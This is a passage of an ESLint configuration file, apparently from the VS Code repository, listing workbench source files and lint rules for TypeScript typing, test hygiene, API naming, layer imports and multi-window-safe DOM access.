			'src/vs/workbench/api/common/extHostTypes.ts',
			'src/vs/workbench/api/common/extHostTypes/es5ClassCompat.ts',
			'src/vs/workbench/api/common/extHostTypes/location.ts',
			'src/vs/workbench/api/common/extHostWebview.ts',
			'src/vs/workbench/api/common/extHostWebviewMessaging.ts',
			'src/vs/workbench/api/common/extHostWebviewPanels.ts',
			'src/vs/workbench/api/common/extHostWebviewView.ts',
			'src/vs/workbench/api/common/extHostWorkspace.ts',
			'src/vs/workbench/api/common/extensionHostMain.ts',
			'src/vs/workbench/api/node/extHostAuthentication.ts',
			'src/vs/workbench/api/node/extHostCLIServer.ts',
			'src/vs/workbench/api/node/extHostConsoleForwarder.ts',
			'src/vs/workbench/api/node/extHostDownloadService.ts',
			'src/vs/workbench/api/node/extHostExtensionService.ts',
			'src/vs/workbench/api/node/extHostMcpNode.ts',
			'src/vs/workbench/api/node/extensionHostProcess.ts',
			'src/vs/workbench/api/node/proxyResolver.ts',
			'src/vs/workbench/api/test/common/testRPCProtocol.ts',
			'src/vs/workbench/api/worker/extHostConsoleForwarder.ts',
			'src/vs/workbench/api/worker/extHostExtensionService.ts',
			'src/vs/workbench/api/worker/extensionHostWorker.ts',
			'src/vs/workbench/contrib/accessibility/browser/accessibilityConfiguration.ts',
			'src/vs/workbench/contrib/accessibilitySignals/browser/commands.ts',
			'src/vs/workbench/contrib/authentication/browser/actions/manageTrustedMcpServersForAccountAction.ts',
			'src/vs/workbench/contrib/bulkEdit/browser/bulkTextEdits.ts',
			'src/vs/workbench/contrib/bulkEdit/browser/preview/bulkEditPane.ts',
			'src/vs/workbench/contrib/bulkEdit/browser/preview/bulkEditPreview.ts',
			'src/vs/workbench/contrib/codeEditor/browser/inspectEditorTokens/inspectEditorTokens.ts',
			'src/vs/workbench/contrib/codeEditor/browser/outline/documentSymbolsOutline.ts',
			'src/vs/workbench/contrib/codeEditor/electron-browser/selectionClipboard.ts',
			'src/vs/workbench/contrib/commands/common/commands.contribution.ts',
			'src/vs/workbench/contrib/comments/browser/commentsTreeViewer.ts',
			'src/vs/workbench/contrib/comments/browser/commentsView.ts',
			'src/vs/workbench/contrib/comments/browser/reactionsAction.ts',
			'src/vs/workbench/contrib/customEditor/browser/customEditorInputFactory.ts',
			'src/vs/workbench/contrib/customEditor/browser/customEditors.ts',
			'src/vs/workbench/contrib/customEditor/common/customEditor.ts',
			'src/vs/workbench/contrib/debug/browser/debugActionViewItems.ts',
			'src/vs/workbench/contrib/debug/browser/debugAdapterManager.ts',
			'src/vs/workbench/contrib/debug/browser/debugCommands.ts',
			'src/vs/workbench/contrib/debug/browser/debugConfigurationManager.ts',
			'src/vs/workbench/contrib/debug/browser/debugEditorActions.ts',
			'src/vs/workbench/contrib/debug/browser/debugEditorContribution.ts',
			'src/vs/workbench/contrib/debug/browser/debugHover.ts',
			'src/vs/workbench/contrib/debug/browser/debugService.ts',
			'src/vs/workbench/contrib/debug/browser/debugSession.ts',
			'src/vs/workbench/contrib/debug/browser/rawDebugSession.ts',
			'src/vs/workbench/contrib/debug/browser/repl.ts',
			'src/vs/workbench/contrib/debug/browser/replViewer.ts',
			'src/vs/workbench/contrib/debug/browser/variablesView.ts',
			'src/vs/workbench/contrib/debug/browser/watchExpressionsView.ts',
			'src/vs/workbench/contrib/debug/common/abstractDebugAdapter.ts',
			'src/vs/workbench/contrib/debug/common/debugger.ts',
			'src/vs/workbench/contrib/debug/common/replModel.ts',
			'src/vs/workbench/contrib/debug/test/common/mockDebug.ts',
			'src/vs/workbench/contrib/editSessions/common/workspaceStateSync.ts',
			'src/vs/workbench/contrib/editTelemetry/browser/helpers/documentWithAnnotatedEdits.ts',
			'src/vs/workbench/contrib/editTelemetry/browser/helpers/utils.ts',
			'src/vs/workbench/contrib/editTelemetry/browser/telemetry/arcTelemetrySender.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionEditor.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionRecommendationNotificationService.ts',
			'src/vs/workbench/contrib/extensions/browser/extensions.contribution.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionsActions.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionsActivationProgress.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionsViewer.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionsViews.ts',
			'src/vs/workbench/contrib/extensions/browser/extensionsWorkbenchService.ts',
			'src/vs/workbench/contrib/extensions/common/extensions.ts',
			'src/vs/workbench/contrib/extensions/electron-browser/runtimeExtensionsEditor.ts',
			'src/vs/workbench/contrib/inlineChat/browser/inlineChatActions.ts',
			'src/vs/workbench/contrib/inlineChat/browser/inlineChatController.ts',
			'src/vs/workbench/contrib/inlineChat/browser/inlineChatStrategies.ts',
			'src/vs/workbench/contrib/markdown/browser/markdownDocumentRenderer.ts',
			'src/vs/workbench/contrib/markers/browser/markers.contribution.ts',
			'src/vs/workbench/contrib/markers/browser/markersView.ts',
			'src/vs/workbench/contrib/mergeEditor/browser/commands/commands.ts',
			'src/vs/workbench/contrib/mergeEditor/browser/utils.ts',
			'src/vs/workbench/contrib/mergeEditor/browser/view/editorGutter.ts',
			'src/vs/workbench/contrib/mergeEditor/browser/view/mergeEditor.ts',
			'src/vs/workbench/contrib/notebook/browser/contrib/clipboard/notebookClipboard.ts',
			'src/vs/workbench/contrib/notebook/browser/contrib/find/notebookFind.ts',
			'src/vs/workbench/contrib/notebook/browser/contrib/layout/layoutActions.ts',
			'src/vs/workbench/contrib/notebook/browser/contrib/profile/notebookProfile.ts',
			'src/vs/workbench/contrib/notebook/browser/contrib/troubleshoot/layout.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/chat/cellChatActions.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/coreActions.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/editActions.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/notebookIndentationActions.ts',
			'src/vs/workbench/contrib/notebook/browser/controller/sectionActions.ts',
			'src/vs/workbench/contrib/notebook/browser/diff/diffComponents.ts',
			'src/vs/workbench/contrib/notebook/browser/diff/inlineDiff/notebookDeletedCellDecorator.ts',
			'src/vs/workbench/contrib/notebook/browser/notebookBrowser.ts',
			'src/vs/workbench/contrib/notebook/browser/outputEditor/notebookOutputEditor.ts',
			'src/vs/workbench/contrib/notebook/browser/services/notebookEditorServiceImpl.ts',
			'src/vs/workbench/contrib/notebook/browser/view/notebookCellList.ts',
			'src/vs/workbench/contrib/notebook/browser/view/renderers/backLayerWebView.ts',
			'src/vs/workbench/contrib/notebook/browser/view/renderers/webviewMessages.ts',
			'src/vs/workbench/contrib/notebook/browser/view/renderers/webviewPreloads.ts',
			'src/vs/workbench/contrib/notebook/browser/viewModel/markupCellViewModel.ts',
			'src/vs/workbench/contrib/notebook/browser/viewParts/notebookEditorStickyScroll.ts',
			'src/vs/workbench/contrib/notebook/browser/viewParts/notebookHorizontalTracker.ts',
			'src/vs/workbench/contrib/notebook/browser/viewParts/notebookKernelQuickPickStrategy.ts',
			'src/vs/workbench/contrib/notebook/common/model/notebookCellTextModel.ts',
			'src/vs/workbench/contrib/notebook/common/model/notebookMetadataTextModel.ts',
			'src/vs/workbench/contrib/notebook/common/model/notebookTextModel.ts',
			'src/vs/workbench/contrib/notebook/common/notebookCommon.ts',
			'src/vs/workbench/contrib/notebook/common/notebookEditorModelResolverServiceImpl.ts',
			'src/vs/workbench/contrib/notebook/test/browser/testNotebookEditor.ts',
			'src/vs/workbench/contrib/performance/electron-browser/startupProfiler.ts',
			'src/vs/workbench/contrib/preferences/browser/preferences.contribution.ts',
			'src/vs/workbench/contrib/preferences/browser/preferencesRenderers.ts',
			'src/vs/workbench/contrib/preferences/browser/settingsEditor2.ts',
			'src/vs/workbench/contrib/preferences/browser/settingsTree.ts',
			'src/vs/workbench/contrib/preferences/browser/settingsTreeModels.ts',
			'src/vs/workbench/contrib/remote/browser/tunnelView.ts',
			'src/vs/workbench/contrib/search/browser/AISearch/aiSearchModel.ts',
			'src/vs/workbench/contrib/search/browser/AISearch/aiSearchModelBase.ts',
			'src/vs/workbench/contrib/search/browser/notebookSearch/notebookSearchModel.ts',
			'src/vs/workbench/contrib/search/browser/notebookSearch/notebookSearchModelBase.ts',
			'src/vs/workbench/contrib/search/browser/notebookSearch/searchNotebookHelpers.ts',
			'src/vs/workbench/contrib/search/browser/replace.ts',
			'src/vs/workbench/contrib/search/browser/replaceService.ts',
			'src/vs/workbench/contrib/search/browser/searchActionsCopy.ts',
			'src/vs/workbench/contrib/search/browser/searchActionsBase.ts',
			'src/vs/workbench/contrib/search/browser/searchActionsFind.ts',
			'src/vs/workbench/contrib/search/browser/searchActionsNav.ts',
			'src/vs/workbench/contrib/search/browser/searchActionsRemoveReplace.ts',
			'src/vs/workbench/contrib/search/browser/searchActionsTextQuickAccess.ts',
			'src/vs/workbench/contrib/search/browser/searchActionsTopBar.ts',
			'src/vs/workbench/contrib/search/browser/searchMessage.ts',
			'src/vs/workbench/contrib/search/browser/searchResultsView.ts',
			'src/vs/workbench/contrib/search/browser/searchTreeModel/fileMatch.ts',
			'src/vs/workbench/contrib/search/browser/searchTreeModel/folderMatch.ts',
			'src/vs/workbench/contrib/search/browser/searchTreeModel/searchModel.ts',
			'src/vs/workbench/contrib/search/browser/searchTreeModel/searchResult.ts',
			'src/vs/workbench/contrib/search/browser/searchTreeModel/searchTreeCommon.ts',
			'src/vs/workbench/contrib/search/browser/searchTreeModel/textSearchHeading.ts',
			'src/vs/workbench/contrib/search/browser/searchView.ts',
			'src/vs/workbench/contrib/search/test/browser/mockSearchTree.ts',
			'src/vs/workbench/contrib/searchEditor/browser/searchEditor.contribution.ts',
			'src/vs/workbench/contrib/searchEditor/browser/searchEditorActions.ts',
			'src/vs/workbench/contrib/searchEditor/browser/searchEditorInput.ts',
			'src/vs/workbench/contrib/snippets/browser/commands/configureSnippets.ts',
			'src/vs/workbench/contrib/snippets/browser/commands/insertSnippet.ts',
			'src/vs/workbench/contrib/snippets/browser/snippetsService.ts',
			'src/vs/workbench/contrib/testing/common/storedValue.ts',
			'src/vs/workbench/contrib/testing/test/browser/testObjectTree.ts',
			'src/vs/workbench/contrib/typeHierarchy/browser/typeHierarchy.contribution.ts',
			'src/vs/workbench/contrib/typeHierarchy/common/typeHierarchy.ts',
			'src/vs/workbench/contrib/webview/browser/overlayWebview.ts',
			'src/vs/workbench/contrib/webview/browser/webview.ts',
			'src/vs/workbench/contrib/webview/browser/webviewElement.ts',
			'src/vs/workbench/contrib/webviewPanel/browser/webviewEditor.ts',
			'src/vs/workbench/contrib/webviewPanel/browser/webviewEditorInputSerializer.ts',
			'src/vs/workbench/contrib/webviewPanel/browser/webviewWorkbenchService.ts',
			'src/vs/workbench/contrib/welcomeGettingStarted/browser/gettingStartedService.ts',
			'src/vs/workbench/contrib/welcomeWalkthrough/browser/walkThroughPart.ts',
			'src/vs/workbench/services/authentication/common/authentication.ts',
			'src/vs/workbench/services/authentication/test/browser/authenticationQueryServiceMocks.ts',
			'src/vs/workbench/services/commands/common/commandService.ts',
			'src/vs/workbench/services/configurationResolver/common/configurationResolver.ts',
			'src/vs/workbench/services/configurationResolver/common/configurationResolverExpression.ts',
			'src/vs/workbench/services/extensions/common/extensionHostManager.ts',
			'src/vs/workbench/services/extensions/common/extensionsRegistry.ts',
			'src/vs/workbench/services/extensions/common/lazyPromise.ts',
			'src/vs/workbench/services/extensions/common/polyfillNestedWorker.protocol.ts',
			'src/vs/workbench/services/extensions/common/rpcProtocol.ts',
			'src/vs/workbench/services/extensions/worker/polyfillNestedWorker.ts',
			'src/vs/workbench/services/keybinding/browser/keybindingService.ts',
			'src/vs/workbench/services/keybinding/browser/keyboardLayoutService.ts',
			'src/vs/workbench/services/keybinding/common/keybindingEditing.ts',
			'src/vs/workbench/services/keybinding/common/keymapInfo.ts',
			'src/vs/workbench/services/language/common/languageService.ts',
			'src/vs/workbench/services/outline/browser/outline.ts',
			'src/vs/workbench/services/outline/browser/outlineService.ts',
			'src/vs/workbench/services/preferences/common/preferences.ts',
			'src/vs/workbench/services/preferences/common/preferencesModels.ts',
			'src/vs/workbench/services/preferences/common/preferencesValidation.ts',
			'src/vs/workbench/services/remote/common/tunnelModel.ts',
			'src/vs/workbench/services/search/common/replace.ts',
			'src/vs/workbench/services/search/common/search.ts',
			'src/vs/workbench/services/search/common/searchExtConversionTypes.ts',
			'src/vs/workbench/services/search/common/searchExtTypes.ts',
			'src/vs/workbench/services/search/node/fileSearch.ts',
			'src/vs/workbench/services/search/node/rawSearchService.ts',
			'src/vs/workbench/services/search/node/ripgrepTextSearchEngine.ts',
			'src/vs/workbench/services/textMate/common/TMGrammarFactory.ts',
			'src/vs/workbench/services/themes/browser/fileIconThemeData.ts',
			'src/vs/workbench/services/themes/browser/productIconThemeData.ts',
			'src/vs/workbench/services/themes/common/colorThemeData.ts',
			'src/vs/workbench/services/themes/common/plistParser.ts',
			'src/vs/workbench/services/themes/common/themeExtensionPoints.ts',
			'src/vs/workbench/services/themes/common/workbenchThemeService.ts',
			'src/vs/workbench/test/browser/workbenchTestServices.ts',
			'src/vs/workbench/test/common/workbenchTestServices.ts',
			'src/vs/workbench/test/electron-browser/workbenchTestServices.ts',
			// Server
			'src/vs/server/node/remoteAgentEnvironmentImpl.ts',
			'src/vs/server/node/remoteExtensionHostAgentServer.ts',
			'src/vs/server/node/remoteExtensionsScanner.ts',
			// Tests
			'**/*.test.ts',
			'**/*.integrationTest.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'@typescript-eslint': tseslint.plugin,
		},
		rules: {
			'@typescript-eslint/no-explicit-any': [
				'warn',
				{
					'fixToUnknown': false
				}
			]
		}
	},
	// Tests
	{
		files: [
			'**/*.test.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-dangerous-type-assertions': 'off',
			'local/code-must-use-super-dispose': 'off',
			'local/code-no-test-only': 'error',
			'local/code-no-test-async-suite': 'warn',
			'local/code-must-use-result': [
				'warn',
				[
					{
						'message': 'Expression must be awaited',
						'functions': [
							'assertSnapshot',
							'assertHeap'
						]
					}
				]
			]
		}
	},
	// vscode tests specific rules
	{
		files: [
			'src/vs/**/*.test.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-ensure-no-disposables-leak-in-test': [
				'warn',
				{
					// Files should (only) be removed from the list they adopt the leak detector
					'exclude': [
						'src/vs/workbench/services/userActivity/test/browser/domActivityTracker.test.ts',
					]
				}
			]
		}
	},
	// git extension - ban non-type imports from git.d.ts (use git.constants for runtime values)
	{
		files: [
			'extensions/git/src/**/*.ts',
		],
		ignores: [
			'extensions/git/src/api/git.constants.ts',
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'@typescript-eslint': tseslint.plugin,
		},
		rules: {
			'no-restricted-imports': 'off',
			'@typescript-eslint/no-restricted-imports': [
				'warn',
				{
					'patterns': [
						{
							'group': ['*/api/git'],
							'allowTypeImports': true,
							'message': 'Use \'import type\' for types from git.d.ts and import runtime const enum values from git.constants instead'
						},
					]
				}
			]
		}
	},
	// vscode API
	{
		files: [
			'**/vscode.d.ts',
			'**/vscode.proposed.*.d.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'no-restricted-syntax': [
				'warn',
				{
					'selector': `TSArrayType > TSUnionType`,
					'message': 'Use Array<...> for arrays of union types.'
				},
			],
			'local/vscode-dts-create-func': 'warn',
			'local/vscode-dts-literal-or-types': 'warn',
			'local/vscode-dts-string-type-literals': 'warn',
			'local/vscode-dts-interface-naming': 'warn',
			'local/vscode-dts-cancellation': 'warn',
			'local/vscode-dts-use-export': 'warn',
			'local/vscode-dts-use-thenable': 'warn',
			'local/vscode-dts-vscode-in-comments': 'warn',
			'local/vscode-dts-provider-naming': [
				'warn',
				{
					'allowed': [
						'FileSystemProvider',
						'TreeDataProvider',
						'TestProvider',
						'CustomEditorProvider',
						'CustomReadonlyEditorProvider',
						'TerminalLinkProvider',
						'AuthenticationProvider',
						'NotebookContentProvider'
					]
				}
			],
			'local/vscode-dts-event-naming': [
				'warn',
				{
					'allowed': [
						'onCancellationRequested',
						'event'
					],
					'verbs': [
						'accept',
						'archive',
						'change',
						'close',
						'collapse',
						'create',
						'delete',
						'lock',
						'resume',
						'shutdown',
						'suspend',
						'unlock',
						'discover',
						'dispose',
						'drop',
						'edit',
						'end',
						'execute',
						'expand',
						'grant',
						'hide',
						'invalidate',
						'open',
						'override',
						'perform',
						'receive',
						'register',
						'remove',
						'rename',
						'reveal',
						'save',
						'send',
						'start',
						'terminate',
						'trigger',
						'unregister',
						'write',
						'commit'
					]
				}
			]
		}
	},
	// vscode.d.ts
	{
		files: [
			'**/vscode.d.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		rules: {
			'jsdoc/tag-lines': 'off',
			'jsdoc/valid-types': 'off',
			'jsdoc/no-multi-asterisks': [
				'warn',
				{
					'allowWhitespace': true
				}
			],
			'jsdoc/require-jsdoc': [
				'warn',
				{
					'enableFixer': false,
					'contexts': [
						'TSInterfaceDeclaration',
						'TSPropertySignature',
						'TSMethodSignature',
						'TSDeclareFunction',
						'ClassDeclaration',
						'MethodDefinition',
						'PropertyDeclaration',
						'TSEnumDeclaration',
						'TSEnumMember',
						'ExportNamedDeclaration'
					]
				}
			],
			'jsdoc/check-param-names': [
				'warn',
				{
					'enableFixer': false,
					'checkDestructured': false
				}
			],
			'jsdoc/require-returns': 'warn'
		}
	},
	// common/browser layer
	{
		files: [
			'src/**/{common,browser}/**/*.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-amd-node-module': 'warn'
		}
	},
	// node/electron layer
	{
		files: [
			'src/*.ts',
			'src/**/{node,electron-main,electron-utility}/**/*.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'no-restricted-globals': [
				'warn',
				'name',
				'length',
				'event',
				'closed',
				'external',
				'status',
				'origin',
				'orientation',
				'context',
				// Below are globals that are unsupported in ESM
				'__dirname',
				'__filename',
				'require'
			]
		}
	},
	// electron-main layer: prevent static imports of heavy node_modules
	// that would be synchronously loaded on startup
	{
		files: [
			'src/vs/code/electron-main/**/*.ts',
			'src/vs/code/node/**/*.ts',
			'src/vs/platform/*/electron-main/**/*.ts',
			'src/vs/platform/*/node/**/*.ts',
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-static-node-module-import': [
				'error',
				// Files that run in separate processes, not on the electron-main startup path
				'src/vs/platform/agentHost/node/**/*.ts',
				'src/vs/platform/files/node/watcher/**/*.ts',
				'src/vs/platform/terminal/node/**/*.ts',
				// Files that use small, safe modules
				'src/vs/platform/environment/node/argv.ts',
			]
		}
	},
	// browser/electron-browser layer
	{
		files: [
			'src/**/{browser,electron-browser}/**/*.ts'
		],
		languageOptions: {
			parser: tseslint.parser,
		},
		plugins: {
			'local': pluginLocal,
		},
		rules: {
			'local/code-no-global-document-listener': 'warn',
			'no-restricted-syntax': [
				'warn',
				{
					'selector': `NewExpression[callee.object.name='Intl']`,
					'message': 'Use safeIntl helper instead for safe and lazy use of potentially expensive Intl methods.'
				},
				{
					'selector': `BinaryExpression[operator='instanceof'][right.name='MouseEvent']`,
					'message': 'Use DOM.isMouseEvent() to support multi-window scenarios.'
				},
				{
					'selector': `BinaryExpression[operator='instanceof'][right.name=/^HTML\\w+/]`,
					'message': 'Use DOM.isHTMLElement() and related methods to support multi-window scenarios.'
				},
				{
					'selector': `BinaryExpression[operator='instanceof'][right.name=/^SVG\\w+/]`,
					'message': 'Use DOM.isSVGElement() and related methods to support multi-window scenarios.'
				},
				{
					'selector': `BinaryExpression[operator='instanceof'][right.name='KeyboardEvent']`,
					'message': 'Use DOM.isKeyboardEvent() to support multi-window scenarios.'
				},
				{
					'selector': `BinaryExpression[operator='instanceof'][right.name='PointerEvent']`,
					'message': 'Use DOM.isPointerEvent() to support multi-window scenarios.'
				},
				{
					'selector': `BinaryExpression[operator='instanceof'][right.name='DragEvent']`,
					'message': 'Use DOM.isDragEvent() to support multi-window scenarios.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='activeElement']`,
					'message': 'Use <targetWindow>.document.activeElement to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='contains']`,
					'message': 'Use <targetWindow>.document.contains to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='styleSheets']`,
					'message': 'Use <targetWindow>.document.styleSheets to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='fullscreenElement']`,
					'message': 'Use <targetWindow>.document.fullscreenElement to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='body']`,
					'message': 'Use <targetWindow>.document.body to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='addEventListener']`,
					'message': 'Use <targetWindow>.document.addEventListener to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='removeEventListener']`,
					'message': 'Use <targetWindow>.document.removeEventListener to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='hasFocus']`,
					'message': 'Use <targetWindow>.document.hasFocus to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='head']`,
					'message': 'Use <targetWindow>.document.head to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='exitFullscreen']`,
					'message': 'Use <targetWindow>.document.exitFullscreen to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='getElementById']`,
					'message': 'Use <targetWindow>.document.getElementById to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='getElementsByClassName']`,
					'message': 'Use <targetWindow>.document.getElementsByClassName to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='getElementsByName']`,
					'message': 'Use <targetWindow>.document.getElementsByName to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='getElementsByTagName']`,
					'message': 'Use <targetWindow>.document.getElementsByTagName to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='getElementsByTagNameNS']`,
					'message': 'Use <targetWindow>.document.getElementsByTagNameNS to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='getSelection']`,
					'message': 'Use <targetWindow>.document.getSelection to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='open']`,
					'message': 'Use <targetWindow>.document.open to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='close']`,
					'message': 'Use <targetWindow>.document.close to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='documentElement']`,
					'message': 'Use <targetWindow>.document.documentElement to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='visibilityState']`,
					'message': 'Use <targetWindow>.document.visibilityState to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='querySelector']`,
					'message': 'Use <targetWindow>.document.querySelector to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='querySelectorAll']`,
					'message': 'Use <targetWindow>.document.querySelectorAll to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='elementFromPoint']`,
					'message': 'Use <targetWindow>.document.elementFromPoint to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='elementsFromPoint']`,
					'message': 'Use <targetWindow>.document.elementsFromPoint to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='onkeydown']`,
					'message': 'Use <targetWindow>.document.onkeydown to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='onkeyup']`,
					'message': 'Use <targetWindow>.document.onkeyup to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='onmousedown']`,
					'message': 'Use <targetWindow>.document.onmousedown to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='onmouseup']`,
					'message': 'Use <targetWindow>.document.onmouseup to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': `MemberExpression[object.name='document'][property.name='execCommand']`,
					'message': 'Use <targetWindow>.document.execCommand to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'selector': 'CallExpression[callee.property.name=\'querySelector\']',
					'message': 'querySelector should not be used as relying on selectors is very fragile. Use dom.ts h() to build your elements and access them directly.'
				},
				{
					'selector': 'CallExpression[callee.property.name=\'querySelectorAll\']',
					'message': 'querySelectorAll should not be used as relying on selectors is very fragile. Use dom.ts h() to build your elements and access them directly.'
				},
				{
					'selector': 'CallExpression[callee.property.name=\'getElementById\']',
					'message': 'getElementById should not be used as relying on selectors is very fragile. Use dom.ts h() to build your elements and access them directly.'
				},
				{
					'selector': 'CallExpression[callee.property.name=\'getElementsByClassName\']',
					'message': 'getElementsByClassName should not be used as relying on selectors is very fragile. Use dom.ts h() to build your elements and access them directly.'
				},
				{
					'selector': 'CallExpression[callee.property.name=\'getElementsByTagName\']',
					'message': 'getElementsByTagName should not be used as relying on selectors is very fragile. Use dom.ts h() to build your elements and access them directly.'
				},
				{
					'selector': 'CallExpression[callee.property.name=\'getElementsByName\']',
					'message': 'getElementsByName should not be used as relying on selectors is very fragile. Use dom.ts h() to build your elements and access them directly.'
				},
				{
					'selector': 'CallExpression[callee.property.name=\'getElementsByTagNameNS\']',
					'message': 'getElementsByTagNameNS should not be used as relying on selectors is very fragile. Use dom.ts h() to build your elements and access them directly.'
				}
			],
			'no-restricted-globals': [
				'warn',
				'name',
				'length',
				'event',
				'closed',
				'external',
				'status',
				'origin',
				'orientation',
				'context',
				{
					'name': 'setInterval',
					'message': 'Use <targetWindow>.setInterval to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'clearInterval',
					'message': 'Use <targetWindow>.clearInterval to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'requestAnimationFrame',
					'message': 'Use <targetWindow>.requestAnimationFrame to support multi-window scenarios. Resolve targetWindow with DOM.getWindow(element) or DOM.getActiveWindow() or use the predefined mainWindow constant.'
				},
				{
					'name': 'cancelAnimationFrame',
